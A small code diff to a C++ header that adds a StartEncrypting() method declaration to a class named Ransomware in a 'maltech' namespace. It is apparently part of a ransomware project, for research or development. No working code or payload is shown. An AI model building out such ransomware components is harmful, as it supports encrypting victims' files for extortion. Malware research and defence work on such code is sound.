@@ -10,6 +10,8 @@ namespace maltech {
         public:
             Ransomware(ntdll::NtDll& ntdll);
 
+            void StartEncrypting();
+
         private:
             ntdll::NtDll& ntdll_;
         };
